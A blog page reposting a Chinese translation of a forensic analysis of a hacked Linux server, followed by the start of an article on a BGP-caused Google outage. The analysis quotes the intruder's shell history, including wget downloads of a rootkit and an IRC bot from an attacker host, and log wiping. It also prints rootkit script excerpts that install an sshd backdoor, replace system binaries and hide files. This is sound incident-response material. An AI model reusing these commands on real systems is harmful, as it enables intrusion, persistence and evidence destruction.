
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>The 91 Page | It so life</title>
<meta name="author" content="RobinChia">

<meta name="description" content="It so life">


<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta property="og:site_name" content="It so life"/>

<!--[if IE]><style>.testIE.IE{display:inline;}</style><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" href="/css/ie7.css" type="text/css"><![endif]-->
<!--[if (lt IE 9)&(gt IE 7)]><style>.testIE.IE8{display:inline;}</style><![endif]-->
<!--[if gt IE 8]><style>.testIE.IE9{display:inline;}</style><![endif]-->

<link href="/favicon.png" rel="icon">
<link rel="alternate" href="/atom.xml" title="It so life Feed" type="application/atom+xml">

<link rel="stylesheet" href="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/css/bootstrap.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/font-awesome/4.0.3/css/font-awesome.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/prettify/r298/prettify.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" type="text/css">
<link rel="stylesheet" href="/css/style.css" type="text/css">
<!--[if lt IE 9]>
   <style>article,aside,dialog,footer,header,section,footer,nav,figure,menu{display:block}</style>
   <script src="http://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
   <script src="http://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
<link href="http://cdn.staticfile.org/respond.js/1.4.2/respond-proxy.html" id="respond-proxy" rel="respond-proxy" />
<link href="/js/respond.proxy.gif" id="respond-redirect" rel="respond-redirect" />
<script src="/js/respond.proxy.js"></script>
   <script src="http://cdn.bootcss.com/selectivizr/1.0.2/selectivizr-min.js"></script>
<![endif]-->
<script type="text/javascript">
function loadjs(c,d){var a=document.createElement("script");a.async=!0;a.type="text/javascript";a.src=c;a.charset=d||"gbk";(document.getElementsByTagName("HEAD")[0]||document.getElementsByTagName("BODY")[0]).appendChild(a)};
var _protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
var _js2load = [];
</script>

</head>
<body>
      <header id="header" class="container"><nav id="main-nav" class="navbar navbar-default navbar-fixed-top " role="navigation">
  <div class="container">
    <div class="navbar-header">
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
      <span class="sr-only">Toggle navigation</span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </button>
    <a class="navbar-brand" href="/">It so life</a>
    </div>
    <div  class="collapse navbar-collapse">
      <ul  class="nav navbar-nav">
  
        <li><a href="/" title="Home">Home</a></li>      
        <li><a href="/about/" title="About">About</a></li>      
        <li><a href="/archives/" title="Archives">Archives</a></li>      
      <li class='dropdown'>
        <a class='dropdown-toggle' data-toggle='dropdown' href='#'>website<b class='caret'></b></a>
        <ul class='dropdown-menu pure-menu-selected'>
    
          <li><a href="//groups.google.com/forum/#!forum/pongba" title="TopLanguage">TopLanguage</a></li>    
          <li><a href="//itpub.net/" title="ITPub">ITPub</a></li>    
          <li><a href="//blog.jobbole.com/" title="Bole">Bole</a></li>    
          <li><a href="//nosql-database.org/" title="nosql">nosql</a></li>    
          <li><a href="//gitimmersion.googol.im/" title="Git">Git</a></li>    
        </ul>
      </li>
    
      </ul>
      <ul class="nav navbar-nav navbar-right">
      
        <li><a href="/atom.xml">RSS</a></li>
      
      
        <li><a href="https://twitter.com/robinchia">twitter</a></li>
      
      
      
      
        <li><a href="https://github.com/robinchia">github</a></li>
      
      </ul>
    </div>
  </div>
</nav>
<div class="clearfix"></div>
</header>
  <div id='content' class="container">
     <div class="page-header-wrapper">
      <!--[if lt IE 9]><div class="alert alert-warning alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>提示:</strong>您的浏览器版本太低了,建议升级到 <strong><a href="http://windows.microsoft.com/zh-cn/internet-explorer/download-ie" title="IE9">IE9</a></strong> 以上,本站使用<a href="https://www.google.com/intl/zh-CN/chrome/">Chrome浏览器</a>可以获得最好的显示效果.</div><![endif]-->
      <div class="page-header"><h1 align="center"><big>It so life</big> </h1>
        <h5 align="center"><big>love as life</big></h5>
      </div>
     </div>
     <div class="row">
       <div id="main-col" class="alignleft col-sx-12 col-sm-8 col-md-9 col-lg-9">
      <section id='header_widget'></section>
          <div id="wrapper"><article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--一次服务器被入侵后的分析/">一次服务器被入侵后的分析</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--一次服务器被入侵后的分析/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h3 id="-">一次服务器被入侵后的分析</h3>
<p><a href=""></a><a href="http://www.freebuf.com/author/litdg" title="由 litdg 发布">litdg</a> @ <a href="http://www.freebuf.com/category/articles/system" title="查看 系统安全 中的全部文章" target="_blank">系统安全</a> 2013-09-11 </p>
<p><strong>最近有个朋友让我去帮他看一下他的linux服务器.说是apache启动不了,有很多诡异的情况.后来证明绝不是apache启动不了这么简单.</strong></p>
<p>登上服务器之后随便看了下,最先引起我注意的是”ls”命令的输出:</p>
<p>lars@server1:~$ ls ls: invalid option -- h Try `ls --help&#39; for more information.</p>
<p>为什么”ls”默认加了”-h”参数呢?我用”alias”命令看了一下,然后取消了这个别名之后”ls”就工作正常了.</p>
<p>lars@server1:~$ alias ls alias ls=&#39;ls -sh --color=auto&#39; lars@server1:~$ unalias ls lars@server1:~$ ls backup lars@server1:~$</p>
<p>虽然很奇怪,不过我的首要任务是先把apache启动起来,等过会再仔细研究这个问题.</p>
<p>lars@server1:~$ sudo /etc/init.d/apache2 start Password: /* Starting apache 2.0 web server... (2): apache2: could not open error log file /var/log/apache2/error.log. Unable to open logs ...fail!</p>
<p>纳尼?赶紧去”/var/log/”目录一看,果然”apache2/”文件夹不见了.而且这个目录下其他的文件夹,比如”mysql/”,”samba/”也都不见了.一定是哪里出错了.会不会是我朋友不小心删掉了呢,他跟我说绝对没有.然后我用root登录进去准备修复日志丢失的问题.</p>
<p>lars@server1:~$ sudo -i Password: root@server1:~/# ls ls: unrecognized prefix: do ls: unparsable value for LS_COLORS environment variable total 44 4 . 4 .bashrc 4 .ssh 4 .. 4 .lesshst 8 .viminfo 8 .bash_history 4 .profile 4 .vimrc</p>
<p>很不幸的发现,”ls”又出问题了.同样,用”alias”命令:</p>
<p>root@server1:~/# alias ls alias ls=&#39;ls -sa --color=auto&#39; root@server1:~/# unalias ls root@server1:~/# ls root@server1:~/#</p>
<p>这个时候,我才意识到问题的严重性.”ls”奇怪的举动和”/var/log/”大量日志被删除让我怀疑服务器是否被入侵了.当我看到root目录下的”.bash_history”时,就已经可以确定被入侵了.</p>
<p>root@server1:~/# cat -n .bash_history ... 340 w 341 cd /var 342 wget <a href="http://83.19.148.250/~matys/pliki/shv5.tar.gz" target="_blank">http://83.19.148.250/~matys/pliki/shv5.tar.gz</a> 343 tar -zxf shv5.tar.gz 344 rm -rf shv5.tar.gz 345 mv shv5 .x 346 cd .x 347 ./setup zibi.joe.149 54098 348 passwd 349 passwd 350 ps aux 351 crontab -l 352 cat /etc/issue 353 cat /etc/passwd 354 w 355 who 356 cd /usr/lib/libsh 357 ls 358 hide + 359 chmod +x hide 360 hide + 361 ./hide + 362 cd /var/.x 363 mkdir psotnic 364 cd psotnic 365 wget <a href="http://83.19.148.250/~matys/pliki/psotnic0.2.5.tar.gz" target="_blank">http://83.19.148.250/~matys/pliki/psotnic0.2.5.tar.gz</a> 366 tar -zxf psotnic0.2.5.tar.gz 367 rm -rf psotnic0.2.5.tar.gz 368 ls 369 mv psotnic-0.2.5-linux-static-ipv6 synscan 370 ./synscan 371 vi conf 372 vi conf1 373 mv synscan smbd 374 smbd -c conf 375 ls 376 ps aux 377 ls 378 ./smbd -c conf 379 ./smbd -c conf1 380 ./smbd conf 381 ./smbd conf1 382 ./smbd -a conf conf1 383 rm -rf conf.dec 384 rm -rf conf1.dec 385 cd /usr/lib/libsh 386 ./hide + 387 exit ... 425 ssh ftp@62.101.251.166 426 w 427 ls 428 ls 429 cd /var/.x 430 ls 431 cd psotnic/ 432 ls 433 rm -rf /var/log//* 434 exit 435 ls 436 cd /var/.x/psotnic/ 437 ls 438 vi conf2 439 ./smbd -c conf2 440 ./smbd conf2 441 ./smbd -a conf conf1 conf2 442 rm -rf conf2.dec 443 cd .. 444 ls 445 cd /usr/lib/libsh 446 hide + 447 ./hide + 448 exit 449 ps aux 450 cd /var/.x 451 ls 452 ls 453 cd psotnic/ 454 ls 455 cat pid.MastaH 456 kill -9 2030 457 ./synscan -a conf conf1 458 ./smbd -a conf conf1 459 cd /usr/lib/libsh 460 ./hide +</p>
<p>Woht!这个系统已经被入侵了.这实在是令人激动的一件事情,不过很显然,我的朋友不这么想.这个入侵者犯了一个很基本的错误,没有清除”.bash_history”文件.所以他/她可能在其他的地方也留下了一些蛛丝马迹.接下来就是详细的分析一下这次入侵.</p>
<p>通过bash history我们得到了大量的信息.先来看一下”/var/.x”下面隐藏了什么和命令”setup zibi.joe.149 54098″的作用吧.</p>
<p>root@server1:/var/.x/# file setup setup: Bourne-Again shell script text executable root@server1:/var/.x/# wc -l setup 825 setup root@server1:/var/.x/# head -17 setup /#!/bin/bash /# /# shv5-internal-release /# by: PinT[x] April/2003 /# /# greetz to: /# /# [/<em>] SH-members: BeSo_M, grass^, toolman, nobody, niceboy, armando99 /# C00L|0, GolDenLord, Spike, zion ... /# [/</em>] Alba-Hack : 2Cool, heka, TheMind, ex-THG members ... /# [/<em>] SH-friends: mave, AlexTG, Cat|x, klex, JinkS ... /# [/</em>] tC-members: eksol, termid, hex, keyhook, maher, tripod etc.. /# [/<em>] And all others who diserve to be here but i forgot /# [/</em>] them at the moment ! /# /# PRIVATE ! DO NOT DISTRIBUTE /<em>censored/</em>EZ !</p>
<p>“setup”这个脚本是rootkit shv5的安装脚本.它安装了一个修改过的ssh后门–”/bin/ttyload”,然后把它加到了”/etc/inittab”,这样每次重启后就会自动启动.(相关部分的脚本如下:)</p>
<p>mv $SSHDIR/sshd /sbin/ttyload chmod a+xr /sbin/ttyload chmod o-w /sbin/ttyload touch -acmr /bin/ls /sbin/ttyload chattr +isa /sbin/ttyload kill -9 <code>pidof ttyload</code> &gt;/dev/null 2&gt;&amp;1 .... /# INITTAB SHUFFLING chattr -isa /etc/inittab cat /etc/inittab |grep -v ttyload|grep -v getty &gt; /tmp/.init1 cat /etc/inittab |grep getty &gt; /tmp/.init2 echo &quot;/# Loading standard ttys&quot; &gt;&gt; /tmp/.init1 echo &quot;0:2345:once:/usr/sbin/ttyload&quot; &gt;&gt; /tmp/.init1</p>
<p>它也替换了一些linux的标准命令.</p>
<p>/# Backdoor ps/top/du/ls/netstat/etc.. cd $BASEDIR/bin BACKUP=/usr/lib/libsh/.backup mkdir $BACKUP ... /# ls ... chattr -isa /bin/ls cp /bin/ls $BACKUP mv -f ls /bin/ls chattr +isa /bin/ls</p>
<p>这样子就可以解释为什么”ls”命令输出那么奇怪了.</p>
<p>“.backup”文件夹保存了被替换之前的命令程序.</p>
<p>root@server1:/var/.x/# ls -l /usr/lib/libsh/.backup/ total 552 -rwxr-xr-x 1 root root 126276 Dec 24 22:58 find -rwxr-xr-x 1 root root 59012 Dec 24 22:58 ifconfig -rwxr-xr-x 1 root root 77832 Dec 24 22:58 ls -rwxr-xr-x 1 root root 30388 Dec 24 22:58 md5sum -rwxr-xr-x 1 root root 99456 Dec 24 22:58 netstat -rwxr-xr-x 1 root root 65492 Dec 24 22:58 ps -rwxr-xr-x 1 root root 14016 Dec 24 22:58 pstree -rwxr-xr-x 1 root root 50180 Dec 24 22:58 top</p>
<p>看了一下时间戳,居然是在圣诞节.</p>
<p>很显然,原始的”ls”和后门安装的”ls”是不一样的.他们的md5对比如下:
root@server1:~/# md5sum /usr/lib/libsh/.backup/ls /bin/ls eef7ca9dd6be1cc53bac84012f8d1675 /usr/lib/libsh/.backup/ls 0a07cf554c1a74ad974416f60916b78d /bin/ls root@server1:~/# file /bin/ls /bin/ls: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.0, dynamically linked (uses shared libs), for GNU/Linux 2.0.0, stripped root@server1:~/# file /usr/lib/libsh/.backup/ls /usr/lib/libsh/.backup/ls: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.0, dynamically linked (uses shared libs), for GNU/Linux 2.6.0, stripped</p>
<p>这个rootkit(“sh5.tar.gz”)是从下面的地址下载的.</p>
<p>root@server1:~/# dig +short -x 83.19.148.250 4lo.bydg.pl.</p>
<p>这是一个波兰的ip,从这个ip上没有得到更多的信息.不过这个入侵者依然犯了几个严重的错误.</p>
<p>这是运行”setup”命令的截图:(在服务器上的沙盒里运行的)</p>
<p><img src="http://static.freebuf.com/uploads/image/20130910/20130910030843_30626.jpg" alt=""></p>
<p>所以”zibi.joe.149″是后门的密码,”54098″是端口号.这是一个来自ssh.com的就版本的sshd.测试截图如下:</p>
<p><img src="http://static.freebuf.com/uploads/image/20130910/20130910030856_44197.jpg" alt=""></p>
<p>安装完后门之后,下一个步骤就是装一个irc-bot,让服务器变成僵尸网络中的一员.”psotnic0.2.5.tar.gz”就是来达到这个目的的.入侵者解压这个包之后把 irc-bot重命名为”smbd”,来达到隐藏的目的.</p>
<p>然后,他创建了两个配置文件.文件中包含irc服务器和需要加入的频道.配置文件是加密过的,而且明文的配置文件被删掉了.</p>
<p>371 vi conf 372 vi conf1 .... 378 ./smbd -c conf 379 ./smbd -c conf1 380 ./smbd conf 381 ./smbd conf1 382 ./smbd -a conf conf1</p>
<p>让我们执行一下382这条命令,看看会发生什么.
root@server1:/var/.x/psotnic/# ./smbd -a conf conf1 Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49) Copyright (C) 2003-2005 Grzegorz Rusin [+] Adding: /<em>/10 /</em> /<em> /</em> /<em> cd /var/.x/psotnic; ./smbd conf &gt;/dev/null 2&gt;&amp;1 [+] Adding: /</em>/10 /<em> /</em> /<em> /</em> cd /var/.x/psotnic; ./smbd conf1 &gt;/dev/null 2&gt;&amp;1 [+] Added 2 psotnics to cron</p>
<p>哇!它添加了cron定时任务.赶紧看一看:</p>
<p>root@server1:/var/.x/psotnic/# crontab -l /<em>/10 /</em> /<em> /</em> /<em> cd /var/.x/psotnic; ./smbd conf &gt;/dev/null 2&gt;&amp;1 /</em>/10 /<em> /</em> /<em> /</em> cd /var/.x/psotnic; ./smbd conf1 &gt;/dev/null 2&gt;&amp;1</p>
<p>接下来,我杀掉这两个恶意的smbd进程,禁用cron任务.在另一个shell中运行了tcpdump,然后手动启动了这两个irc-bot进程:
root@server1:~/# cd /var/.x/psotnic; ./smbd conf Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49) Copyright (C) 2003-2005 Grzegorz Rusin [/<em>] Acting as LEAF [+] Config loaded [+] Going into background [pid: 5724] root@server1:/var/.x/psotnic/# ./smbd conf1 Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49) Copyright (C) 2003-2005 Grzegorz Rusin [/</em>] Acting as LEAF [+] Config loaded [+] Going into background [pid: 5727] root@server1:/var/.x/psotnic/#</p>
<p>用”ps”命令(后门替换过的)可以看到这两个进程.这也是为什么入侵者需要通过改名字来隐藏进程.</p>
<p>root@server1:/var/.x/psotnic/# ps axuw | grep smb root 3799 0.0 0.4 8592 2156 ? S 11:00 0:00 /usr/sbin/smbd -D root 3808 0.0 0.1 8592 896 ? S 11:00 0:00 /usr/sbin/smbd -D root 5724 0.0 0.1 1648 772 pts/2 S 12:47 0:00 ./smbd conf root 5727 0.0 0.1 1640 764 pts/2 S 12:47 0:00 ./smbd conf1</p>
<p>最开始两个是真正的samba进程,后面两个是irc-bot,让我们用”strace”命令来看看它做了什么:
root@server1:~/# strace -p 5727 ... connect(3, {sa_family=AF_INET, sin_port=htons(9714), sin_addr=inet_addr(&quot;83.18.74.235&quot;)}, 16) = -1 EINPROGRESS (Operation now in progress) ... connect(4, {sa_family=AF_INET, sin_port=htons(6667), sin_addr=inet_addr(&quot;195.159.0.92&quot;)}, 16) = -1 EINPROGRESS (Operation now in progress)</p>
<p>可以看到它尝试连接ip 83.18.74.235的9714端口和195.159.0.92的6667端口:</p>
<p>root@server1:~/# dig +short -x 83.18.74.235 manhattan.na.pl. root@server1:~/# dig +short -x 195.159.0.92 ircnet.irc.powertech.no.</p>
<p>又是一个波兰的ip.另外一个ip,”ircnet.irc.powertech.no”是”irc.powertech.nof”的别名.是挪威一个著名的irc服务器.</p>
<p>tcpdump抓到了连接irc服务器的流量.正如下面的内容显示,它连接到了”irc.powertech.no”,加入了”/#aik”频道.
:irc.powertech.no 001 578PAB9NB :Welcome to the Internet Relay Network 578PAB9NB!~op@ti231210a080-3666.bb.online.no :irc.powertech.no 002 578PAB9NB :Your host is irc.powertech.no, running version 2.11.1p1 :578PAB9NB!~op@ti231210a080-3666.bb.online.no JOIN :/#aik :irc.powertech.no 353 578PAB9NB @ /#aik :578PAB9NB kknd raider brandyz jpi conf xerkoz IpaL vvo :irc.powertech.no 366 578PAB9NB /#aik :End of NAMES list. :irc.powertech.no 352 578PAB9NB /#aik ~op ti231210a080-3666.bb.online.no irc.powertech.no 578PAB9NB G :0 op - GTW :irc.powertech.no 352 578PAB9NB /#aik ~kknd ti231210a080-3666.bb.online.no irc.hitos.no kknd H :2 kknd - GTW :irc.powertech.no 352 578PAB9NB /#aik ~raider mobitech-70.max-bc.spb.ru /<em>.dotsrc.org raider G :4 raider - GTW :irc.powertech.no 352 578PAB9NB /#aik ~brandyz mobitech-70.max-bc.spb.ru /</em>.dotsrc.org brandyz G :4 brandyz - GTW :irc.powertech.no 352 578PAB9NB /#aik ~jpi p3124-ipad309sasajima.aichi.ocn.ne.jp /<em>.jp jpi G :8 jpi - GTW :irc.powertech.no 352 578PAB9NB /#aik ~conf p3124-ipad309sasajima.aichi.ocn.ne.jp /</em>.jp conf G :7 conf - GTW :irc.powertech.no 352 578PAB9NB /#aik ~xerkoz p3124-ipad309sasajima.aichi.ocn.ne.jp /<em>.jp xerkoz H :7 xerkoz - GTW :irc.powertech.no 352 578PAB9NB /#aik lm campus19.panorama.sth.ac.at /</em>.at IpaL H :5 .LaPi.9@.IRCNet.. :irc.powertech.no 352 578PAB9NB /#aik ~vvo ppp86-7.intelcom.sm /*.tiscali.it vvo H :6 vvo - GTW :irc.powertech.no 315 578PAB9NB /#aik :End of WHO list. 这些仅仅是加入/#aik频道,并开始监听该频道所有成员的一些原始网络流量.我决定自己进入这个频道看看.令我惊讶的是不需要任何密码我就进来了. 17:43 -!- viper42 [~viper42@trinity.gnist.org] has joined /#aik 17:43 [Users /#aik] 17:43 [ 578PAB9NL] [ conf] [ jpi ] [ raider ] [ vvo ] 17:43 [ brandyz ] [ IpaL] [ kknd] [ viper42] [ xerkoz] 17:43 -!- Irssi: /#aik: Total of 10 nicks [0 ops, 0 halfops, 0 voices, 10 normal] 17:43 -!- Irssi: Join to /#aik was synced in 1 secs</p>
<p>我发现我朋友的服务器使用的昵称是”578PQB9NB”,还有一些其他的服务器也在这里.这些僵尸服务器应该是正在等待着我们的入侵者加入频道发布命令.或者他已经潜藏在这里了.我注意到,所有的昵称都有一个后缀”\/*-GTW”,只有一个没有:</p>
<p>17:45 [powertech] -!- IpaL [lm@campus19.panorama.sth.ac.at] 17:45 [powertech] -!- ircname : LaPi@IRCNet 17:45 [powertech] -!- channels : /#relaks /#ping @/#seks /#aik @/#ogame.pl /#pingwinaria /#hattrick /#trade /#admin @/#!sh 17:45 [powertech] -!- server : /*.at [\o\ \o/ /o/]</p>
<p>这是唯一一个加入了多个频道的昵称.我猜我已经找到这个入侵者了,除非这是一个故意迷惑的诱饵.(恩,这个入侵者真的真么笨!!这么容易就找到了!?).我决定等几天看看有木有什么有趣的事情发生.这个域名解析到了:</p>
<p>$ dig +short campus19.panorama.sth.ac.at 193.170.51.84</p>
<p>根据RIPE的数据,这个ip属于Vienna University计算机中心,我发了一封邮件询问关于这个域名的信息,他们几个小时后会我了:
From: Alexander Talos via RT To: larstra@ifi.uio.no Subject: Cracker at campus19.panorama.sth.ac.at (193.170.51.84) [ACOnet CERT /#38603] Date: Fri, 18 May 2007 18:22:43 +0200 (CEST) Reply-To: cert@aco.net -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1 Hej! On Fri May 18 14:45:03 2007, larstra@ifi.uio.no wrote: &gt; I have been tracking down cracker which connected from &gt; campus19.panorama.sth.ac.at (193.170.51.84). The user, which Ouch. panorama.sth.ac.at is a dormitory with about 4k rooms all behind a NAT gateway - it will be very hard to get hold of the miscreant. This incident will, in the long run, definitely help me getting rid of the NAT boxes in setups like that, but right now, we will have to make do with what we have. &gt; Please investigate the host in question. Perhaps is this a &gt; compromised host on your network acting as a jumpstation for Sure, and even in a NATed environment, this is still possible. Btw, you did a great job in analysing the compromised machine! I&#39;ll let you know when I have either further questions or any interesting results. Cheers, Alexander Talos - -- IT-Security, Universitaet Wien, ACOnet CERT T: +43-1-4277-14351 M: +43-664-60277-14351</p>
<p>看起来我不够幸运.</p>
<p>接下来我曾尝试连接irc频道里其他僵尸主机的 54098端口,可惜都失败了.看来其他的僵尸主机的后门可能使用的是别的端口.</p>
<p>连接到”83.18.74.235″的流量看起来很混乱.只好再次用strace命令:</p>
<p>root@server1:/var/.x/psotnic/# strace -f ./smbd conf1 &amp;&gt; /root/dump.strace</p>
<p>跟预期的一样,有很多输出,其中一个是它尝试启动”BitchX”,这是一个irc客户端.但是失败了,因为BitchX没有安装:</p>
<p>[pid 7537] write(2, &quot;sh: &quot;, 4) = 4 [pid 7537] write(2, &quot;BitchX: not found&quot;, 17) = 17 [pid 7537] write(2, &quot;n&quot;, 1) = 1 [pid 7537] close(2) = 0</p>
<p>下面的截图是tcpdump抓到流量的一部分:</p>
<p><img src="http://static.freebuf.com/uploads/image/20130911/20130911000637_34187.jpg" alt=""></p>
<p>这仅仅是两个假的smbd进程中的一个.另外一个也连到了两个irc服务器,一个是波兰这个,另外一个是”irc.hitos.no”,位于挪威的特罗姆斯郡.</p>
<p>入侵者除了这些,还运行了一个叫”hide”的脚本来清除日志:
root@server1:/usr/lib/libsh/# ./hide + Linux Hider v2.0 by mave enhanced by me! [+] [Shkupi Logcleaner] Removing + from the logs........ . [+] /var/log/messages ... [done] [+] /var/run/utmp ... [done] [+] /var/log/lastlog ... [done] [+] /var/log/wtmp ... [done] /<em> m i s s i o n a c c o m p l i s h e d /</em> p.h.e.e.r S.H.c.r.e.w</p>
<p>那么这个入侵者为什么还要把”/var/log/”目录全删除了呢,是不相信这个工具么?还是他特别害怕?</p>
<p>可以看到这个服务器被入侵了,安装了后门而且加入了僵尸网咯.但是入侵者犯了几个错误导致他可能被侦查到:</p>
<p>1, 忘记清除”.bash_history”文件</p>
<p>2, “/var/log”目录下所有文件都删除了.导致某些程序无法启动.很容易被发现.</p>
<p>3, 修改了root的密码.又是一个愚蠢的行为.永远不要修改root密码,这个必然会引起管理员的注意.</p>
<p>4, irc的频道没有密码保护.虽然即使有密码,我们也可以抓包分析出来.</p>
<p>5, 入侵者平时就在僵尸网络的频道闲逛?如果是这样的话那他已经暴露了.</p>
<p>当然还有几个遗留的问题:</p>
<p>1,”ssh ftp@62.101.251.166″ 这个命令是干嘛的.是入侵者不小心敲错了么还是有其他的目的?</p>
<p>$ dig +short -x 62.101.251.166 cA6FB653E.dhcp.bluecom.no.</p>
<p>2,跟83.18.74.235(manhattan.na.pl)的通讯内容是什么?</p>
<p>3,最重要的问题是他一开始是如何或得下系统的权限的?这个服务器运行的是Ubuntu 6.06 LTS,打了最新的补丁.可能入侵的途径:</p>
<p>/<em>猜测root密码,不幸的是这个密码是强密码/</em></p>
<p>/<em>未知的exploit/</em></p>
<p>/<em>某个用户在已经被攻陷的主机上登录这台服务器.入侵者嗅探到了密码./</em></p>
<p><a href="http://blog.larsstrand.no/2007/04/holiday-cracking.html" target="_blank">原文地址</a>
9 1 您已评价！</p>
<h6 id="-freebuf-com-http-www-freebuf-com-"><strong>如文中未特别声明转载请注明出自:</strong> <a href="http://www.freebuf.com/" target="_blank">FreebuF.COM</a></h6>
<h3 id="-">相关文章</h3>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12696.html" target="_blank">Dionaea低交互式蜜罐部署详解</a></li>
</ul>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12443.html" target="_blank">一次服务器被入侵后的分析</a></li>
</ul>
<ul>
<li><p><a href="http://www.freebuf.com/articles/system/12182.html" target="_blank">Socks代理反弹突破内网</a></p>
</li>
<li><p><a href="http://www.freebuf.com/articles/system/12140.html" target="_blank">如何导出Windows哈希系列二</a></p>
</li>
<li><p><a href="http://www.freebuf.com/articles/system/12104.html" target="_blank">浅谈企业运维安全</a>
﻿</p>
</li>
</ul>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-29 21:44:15"datetime="2014-03-29 21:44:15"> mar. 29 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--一次服务器被入侵后的分析/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--一次服务器被入侵后的分析" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--从谷歌宕机事件认识互联网工作原理-CSDNNET/">从谷歌宕机事件认识互联网工作原理</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--从谷歌宕机事件认识互联网工作原理-CSDNNET/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-">从谷歌宕机事件认识互联网工作原理</h1>
<p><strong>摘要：</strong>谷歌服务器经历了短暂的宕机事件，持续大概27分钟，对部分地区的互联网用户造成了影响。此次事件的原因深究起来需要进入互联网络那深邃的、黑暗的角落。
<strong>译者注：本文中提到CloudFlare是一家总部位于美国旧金山的内容分发网络(CDN)服务公司，由Project Honey Pot项目的三位前开发人员成立于2009年。2011年10月被华尔街日报评为最具创新精神的网络科技公司。</strong></p>
<p>今天，谷歌服务器经历了短暂的宕机事件，持续大概27分钟，对部分地区的互联网用户造成了影响。此次事件的原因深究起来需要进入互联网络那深邃的、黑暗的角落。我是CloudFlare公司的一名网络工程师，在帮助谷歌从此次宕机中恢复回来提供了一臂之力。下面就是事情发生的过程。</p>
<p>大约在太平洋标准时间2012年11月5号下午6：24分/时间标准时间2012年11月6号凌晨2：24分，CloudFlare的员工发现谷歌的服务中断了。我们使用谷歌的电子邮件等服务，所以，当它的服务不正常时，办公室的人会很快发现。我在网络技术小组工作，因此我立刻接上网络查看是什么情况——是局部区域问题还是全球问题。</p>
<p><strong>问题排查</strong></p>
<p>我很快就意识到，所有谷歌的服务我们都不能连接上——甚至包括连接 8.8.8.8，谷歌的公共DNS服务器——于是，我从追查DNS开始。</p>
<ol>
<li>dig +trace google.com </li>
</ol>
<p>下面是我在探测Google.com的域名服务器时得到的回复：</p>
<p>google.com. 172800 IN NS ns2.google.com.</p>
<p>google.com. 172800 IN NS ns1.google.com.</p>
<p>google.com. 172800 IN NS ns3.google.com.</p>
<p>google.com. 172800 IN NS ns4.google.com.</p>
<p>;; Received 164 bytes from 192.12.94.30/#53(e.gtld-servers.net) in 152 ms</p>
<p>;; connection timed out; no servers could be reached</p>
<p>无法探测到任何服务器的结果证明确实有什么地方出了问题。尤其是，这意味着从我们的办公室将连接不到任何的谷歌DNS服务器。</p>
<p>我开始网络层查找问题，看看是否是在这个通信层出了问题。
PING 216.239.32.10 (216.239.32.10): 56 data bytes</p>
<p>Request timeout for icmp_seq 0</p>
<p>92 bytes from 1-1-15.edge2-eqx-sin.moratelindo.co.id (202.43.176.217): Time to live exceeded</p>
<p>这里出现了奇怪的信息。通常，我们不应该在谷歌的路由信息中看到一个印度尼西亚的网络服务提供商(Moratel)的名字。我立即进入一个CloudFlare的路由器中查看发生了什么事。与此同时，Twitter上世界其它地方的报告显示了我们并不是唯一遇到问题的地方。</p>
<p><strong>互联网路由</strong></p>
<p>为了理解是出了什么问题，你需要知道一些互联网是如何工作的基础知识。整个互联网是由很多的网络组成，这些网络被称为是“自治系统(AS)”。每个网络都有一个唯一的数字来标志自己，被称为AS号。CloudFlare的AS号是13335，谷歌的AS号是15169。各个网络通过一种叫做边缘网关协议(BGP)的技术互相连接。边缘网关协议被称为是互联网的粘合剂——由它来声明哪个IP地址属于哪个网络，由它来建立从某个自治网络到另外一个自治网络的路由。一个互联网“路由”跟这个词的表意完全一样：由一个自治网络里的IP地址到另外一个自治网络里的另一个IP地址的路径。</p>
